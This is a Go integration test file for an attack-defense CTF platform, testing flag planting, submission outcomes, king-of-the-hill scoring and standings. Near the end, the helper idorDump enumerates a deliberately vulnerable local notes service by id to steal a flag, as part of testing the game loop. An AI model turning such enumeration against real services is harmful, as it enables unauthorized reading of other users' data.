//go:build integration

package game

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/anvil-lab/anvil/internal/config"
	"github.com/anvil-lab/anvil/internal/database"
	"github.com/google/uuid"
	"go.uber.org/zap"
)

func envOr(key, def string) string {
	if v := os.Getenv(key); v != "" {
		return v
	}
	return def
}

func testDB(t *testing.T) *database.DB {
	t.Helper()
	port, _ := strconv.Atoi(envOr("ANVIL_TEST_DB_PORT", "55432"))
	dbCfg := config.DatabaseConfig{
		Host:         envOr("ANVIL_TEST_DB_HOST", "127.0.0.1"),
		Port:         port,
		User:         envOr("ANVIL_TEST_DB_USER", "anvil"),
		Password:     envOr("ANVIL_TEST_DB_PASSWORD", "test"),
		Database:     envOr("ANVIL_TEST_DB_NAME", "anvil"),
		SSLMode:      "disable",
		MaxOpenConns: 10,
		MaxIdleConns: 2,
	}

	var db *database.DB
	var err error
	for i := 0; i < 40; i++ {
		if db, err = database.New(dbCfg); err == nil {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	if err != nil {
		t.Fatalf("connect after retries (is the test postgres up?): %v", err)
	}
	if err := db.Migrate(); err != nil {
		t.Fatalf("migrate: %v", err)
	}
	_, err = db.Pool.Exec(context.Background(),
		`TRUNCATE game_teams, game_services, game_ticks, game_koth_hills, game_koth_rounds, users CASCADE`)
	if err != nil {
		t.Fatalf("truncate: %v", err)
	}
	return db
}

func okChecker(t *testing.T) string {
	t.Helper()
	p := filepath.Join(t.TempDir(), "ok.sh")
	if err := os.WriteFile(p, []byte("#!/bin/sh\ncat >/dev/null\nprintf '{\"status\":\"OK\"}'\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	return p
}

func seedTeam(t *testing.T, db *database.DB, name string) uuid.UUID {
	t.Helper()
	id := uuid.New()
	_, err := db.Pool.Exec(context.Background(),
		`INSERT INTO game_teams (id, name, slug, token, status, is_nop, vulnbox_ip)
		 VALUES ($1, $2, $2, $2, 'active', false, '127.0.0.1')`, id, name)
	if err != nil {
		t.Fatalf("seed team %s: %v", name, err)
	}
	return id
}

func seedService(t *testing.T, db *database.DB, checker string) uuid.UUID {
	t.Helper()
	id := uuid.New()
	_, err := db.Pool.Exec(context.Background(),
		`INSERT INTO game_services (id, name, slug, category, tier, port, checker_ref, flag_stores, enabled)
		 VALUES ($1, 'Notes', 'notes', 'misc', 'core', 1, $2, 1, true)`, id, checker)
	if err != nil {
		t.Fatalf("seed service: %v", err)
	}
	return id
}

func kothChecker(t *testing.T, controllerToken string) string {
	t.Helper()
	body := fmt.Sprintf("#!/bin/sh\nline=$(cat)\ncase \"$line\" in\n  *'\"action\":\"control\"'*) printf '{\"controller\":\"%s\"}' ;;\n  *) printf '{}' ;;\nesac\n", controllerToken)
	p := filepath.Join(t.TempDir(), "koth.sh")
	if err := os.WriteFile(p, []byte(body), 0o755); err != nil {
		t.Fatal(err)
	}
	return p
}

func seedHill(t *testing.T, db *database.DB, checker string) uuid.UUID {
	t.Helper()
	id := uuid.New()
	_, err := db.Pool.Exec(context.Background(),
		`INSERT INTO game_koth_hills (id, name, slug, host, port, checker_ref, reset_seconds, enabled)
		 VALUES ($1, 'Hill', 'hill', '127.0.0.1', 1, $2, 900, true)`, id, checker)
	if err != nil {
		t.Fatalf("seed hill: %v", err)
	}
	return id
}

func TestIntegrationKoth(t *testing.T) {
	ctx := context.Background()
	db := testDB(t)
	defer db.Close()

	a := seedTeam(t, db, "alpha")
	seedTeam(t, db, "bravo")
	seedHill(t, db, kothChecker(t, "alpha"))

	ctrl := testController(db) // round = 2 ticks
	ctrl.runTick(ctx, 1)
	ctrl.runTick(ctx, 2)
	ctrl.runTick(ctx, 3) // enters round 2 -> closes round 1

	if n := count(t, db, `SELECT COUNT(*) FROM game_koth_control WHERE controller_team_id IS NOT NULL`); n != 3 {
		t.Fatalf("expected 3 control records for alpha, got %d", n)
	}
	if n := count(t, db, `SELECT COUNT(*) FROM game_koth_rounds WHERE round_number = 1 AND status = 'closed'`); n != 1 {
		t.Fatalf("round 1 should be closed exactly once")
	}

	var bonus float64
	if err := db.Pool.QueryRow(ctx,
		`SELECT COALESCE(SUM(points), 0) FROM game_score_events WHERE team_id = $1 AND stream = 'KOTH'`, a).
		Scan(&bonus); err != nil {
		t.Fatal(err)
	}
	if bonus != 12 {
		t.Errorf("alpha round-1 rank bonus: got %v want 12", bonus)
	}

	// koth = per-tick hold (5 x 3 ticks) + round-1 rank bonus (12) = 27
	if s := getStanding(t, db, a); s.koth != 27 {
		t.Errorf("alpha koth standing: got %v want 27", s.koth)
	}
}

type standingRow struct {
	attack, defense, sla, koth, total float64
	rank                              int
}

func getStanding(t *testing.T, db *database.DB, team uuid.UUID) standingRow {
	t.Helper()
	var s standingRow
	err := db.Pool.QueryRow(context.Background(),
		`SELECT attack, defense, sla, koth, total, COALESCE(rank, 0) FROM game_standings WHERE team_id = $1`, team).
		Scan(&s.attack, &s.defense, &s.sla, &s.koth, &s.total, &s.rank)
	if err != nil {
		t.Fatalf("get standing: %v", err)
	}
	return s
}

func testController(db *database.DB) *Controller {
	return NewController(config.GameConfig{
		Enabled:        true,
		TickInterval:   time.Minute,
		FlagValidTicks: 10,
		FlagPrefix:     "H7CTF",
		Koth:           config.KothConfig{RoundInterval: 2 * time.Minute, ResetEnabled: true},
		Scoring: config.ScoringConfig{
			AttackBase:    100,
			DefenseFactor: 1,
			SLAPoints:     10,
			KothHold:      5,
			KothRank:      []int{12, 7, 4, 2, 1},
		},
	}, db, zap.NewNop())
}

func count(t *testing.T, db *database.DB, q string) int {
	t.Helper()
	var n int
	if err := db.Pool.QueryRow(context.Background(), q).Scan(&n); err != nil {
		t.Fatalf("count: %v", err)
	}
	return n
}

func TestIntegrationADLoop(t *testing.T) {
	ctx := context.Background()
	db := testDB(t)
	defer db.Close()

	a := seedTeam(t, db, "alpha")
	b := seedTeam(t, db, "bravo")
	c := seedTeam(t, db, "charlie")
	seedService(t, db, okChecker(t))

	ctrl := testController(db)
	ctrl.runTick(ctx, 1)

	if n := count(t, db, `SELECT COUNT(*) FROM game_flags WHERE tick_number = 1`); n != 3 {
		t.Fatalf("expected 3 flags planted, got %d", n)
	}
	if n := count(t, db, `SELECT COUNT(*) FROM game_sla_checks WHERE status = 'OK'`); n != 3 {
		t.Fatalf("expected 3 OK sla checks, got %d", n)
	}
	if s := getStanding(t, db, a); s.sla <= 0 {
		t.Fatalf("expected positive SLA after an OK tick, got %v", s.sla)
	}

	var flagB string
	if err := db.Pool.QueryRow(ctx, `SELECT flag FROM game_flags WHERE team_id = $1`, b).Scan(&flagB); err != nil {
		t.Fatalf("read bravo's flag: %v", err)
	}

	assertOutcome(t, db, a, flagB, SubmitAccepted)
	assertOutcome(t, db, a, flagB, SubmitDuplicate)
	assertOutcome(t, db, b, flagB, SubmitOwnFlag)
	assertOutcome(t, db, a, "H7CTF{NOPE}", SubmitInvalid)

	// A stale flag (past its window) must be rejected as expired.
	var stale string = "H7CTF{STALE0000}"
	_, err := db.Pool.Exec(ctx,
		`INSERT INTO game_flags (tick_number, team_id, service_id, store_index, flag, valid_from_tick, valid_until_tick)
		 SELECT 1, $1, id, 1, $2, 1, 0 FROM game_services LIMIT 1`, c, stale)
	if err != nil {
		t.Fatalf("insert stale flag: %v", err)
	}
	assertOutcome(t, db, a, stale, SubmitExpired)

	ctrl.recomputeStandings(ctx)

	sa := getStanding(t, db, a)
	sb := getStanding(t, db, b)
	if sa.attack != 100 {
		t.Errorf("alpha attack: got %v want 100 (sole captor of one flag)", sa.attack)
	}
	if sb.defense != -1 {
		t.Errorf("bravo defense: got %v want -1 (one flag lost to one team)", sb.defense)
	}
	if sa.total <= sb.total {
		t.Errorf("alpha (%.2f) should outrank bravo (%.2f)", sa.total, sb.total)
	}
	if sa.rank != 1 {
		t.Errorf("alpha should be rank 1, got %d", sa.rank)
	}
}

func assertOutcome(t *testing.T, db *database.DB, team uuid.UUID, flag string, want SubmitOutcome) {
	t.Helper()
	got, err := SubmitFlag(context.Background(), db, team, flag)
	if err != nil {
		t.Fatalf("submit %q: %v", flag, err)
	}
	if got != want {
		t.Errorf("submit %q: got %q want %q", flag, got, want)
	}
}

func TestIntegrationTeamForUser(t *testing.T) {
	ctx := context.Background()
	db := testDB(t)
	defer db.Close()

	team := seedTeam(t, db, "alpha")
	user := uuid.New()
	_, err := db.Pool.Exec(ctx,
		`INSERT INTO users (id, username, email, password_hash, role, status)
		 VALUES ($1, 'p1', 'p1@example.com', 'x', 'user', 'active')`, user)
	if err != nil {
		t.Fatalf("seed user: %v", err)
	}
	if _, err := db.Pool.Exec(ctx,
		`INSERT INTO game_team_members (team_id, user_id, role) VALUES ($1, $2, 'captain')`, team, user); err != nil {
		t.Fatalf("seed member: %v", err)
	}

	got, ok, err := TeamForUser(ctx, db, user)
	if err != nil || !ok || got != team {
		t.Fatalf("TeamForUser: got %v ok=%v err=%v want %v", got, ok, err, team)
	}
	if _, ok, _ := TeamForUser(ctx, db, uuid.New()); ok {
		t.Errorf("unknown user should not resolve to a team")
	}
}

func seedTeamIP(t *testing.T, db *database.DB, name, ip string) uuid.UUID {
	t.Helper()
	id := uuid.New()
	_, err := db.Pool.Exec(context.Background(),
		`INSERT INTO game_teams (id, name, slug, token, status, is_nop, vulnbox_ip)
		 VALUES ($1, $2, $2, $2, 'active', false, $3)`, id, name, ip)
	if err != nil {
		t.Fatalf("seed team %s: %v", name, err)
	}
	return id
}

func seedServiceOnPort(t *testing.T, db *database.DB, checker string, port int) {
	t.Helper()
	_, err := db.Pool.Exec(context.Background(),
		`INSERT INTO game_services (id, name, slug, category, tier, port, checker_ref, flag_stores, enabled)
		 VALUES ($1, 'Notes', 'notes', 'misc', 'core', $2, $3, 1, true)`, uuid.New(), port, checker)
	if err != nil {
		t.Fatalf("seed service: %v", err)
	}
}

func startNotes(t *testing.T, serverPy, host string, port int) *exec.Cmd {
	t.Helper()
	cmd := exec.Command("python3", serverPy)
	cmd.Env = append(os.Environ(), "HOST="+host, fmt.Sprintf("PORT=%d", port))
	if err := cmd.Start(); err != nil {
		t.Fatalf("start notes on %s: %v", host, err)
	}
	addr := net.JoinHostPort(host, strconv.Itoa(port))
	for i := 0; i < 50; i++ {
		if conn, err := net.DialTimeout("tcp", addr, 300*time.Millisecond); err == nil {
			conn.Close()
			return cmd
		}
		time.Sleep(200 * time.Millisecond)
	}
	cmd.Process.Kill()
	t.Fatalf("notes on %s never came up", addr)
	return nil
}

// idorDump exploits FETCH-by-id (no auth, no ownership check) to read every note.
func idorDump(t *testing.T, host string, port, maxID int) []string {
	t.Helper()
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), 2*time.Second)
	if err != nil {
		t.Fatalf("dial %s: %v", host, err)
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Second))
	r := bufio.NewReader(conn)
	r.ReadString('\n') // banner

	var vals []string
	for id := 1; id <= maxID; id++ {
		fmt.Fprintf(conn, "FETCH %d\n", id)
		line, err := r.ReadString('\n')
		if err != nil {
			break
		}
		if line = strings.TrimSpace(line); strings.HasPrefix(line, "OK ") {
			vals = append(vals, strings.TrimPrefix(line, "OK "))
		}
	}
	return vals
}

// TestIntegrationRealService runs the whole chain with real components: two live
// H7-NOTES services, the real checker planting real flags each tick, then a real
// IDOR exploit that steals a flag and submits it for points.
func TestIntegrationRealService(t *testing.T) {
	dir, err := filepath.Abs("../../services/example-notes")
	if err != nil {
		t.Fatal(err)
	}
	serverPy := filepath.Join(dir, "server.py")
	checkerPy := filepath.Join(dir, "checker.py")
	if _, err := os.Stat(serverPy); err != nil {
		t.Skip("reference service not present")
	}
	if _, err := exec.LookPath("python3"); err != nil {
		t.Skip("python3 not available")
	}

	ctx := context.Background()
	db := testDB(t)
	defer db.Close()

	na := startNotes(t, serverPy, "127.0.0.2", 9001)
	defer na.Process.Kill()
	nb := startNotes(t, serverPy, "127.0.0.3", 9001)
	defer nb.Process.Kill()

	a := seedTeamIP(t, db, "alpha", "127.0.0.2")
	b := seedTeamIP(t, db, "bravo", "127.0.0.3")
	seedServiceOnPort(t, db, checkerPy, 9001)

	ctrl := testController(db)
	ctrl.runTick(ctx, 1)

	if n := count(t, db, `SELECT COUNT(*) FROM game_sla_checks WHERE status = 'OK'`); n != 2 {
		t.Fatalf("expected 2 OK sla checks from the real checker, got %d", n)
	}

	var target string
	if err := db.Pool.QueryRow(ctx, `SELECT flag FROM game_flags WHERE team_id = $1`, b).Scan(&target); err != nil {
		t.Fatalf("read bravo's planted flag: %v", err)
	}

	stolen := ""
	for _, v := range idorDump(t, "127.0.0.3", 9001, 20) {
		if v == target {
			stolen = v
		}
	}
	if stolen == "" {
		t.Fatalf("IDOR exploit did not recover bravo's flag from its service")
	}

	if out, err := SubmitFlag(ctx, db, a, stolen); err != nil || out != SubmitAccepted {
		t.Fatalf("submit stolen flag: got %s err=%v want accepted", out, err)
	}
	ctrl.recomputeStandings(ctx)
	if s := getStanding(t, db, a); s.attack <= 0 {
		t.Fatalf("alpha should have attack points after a real steal, got %v", s.attack)
	}
}
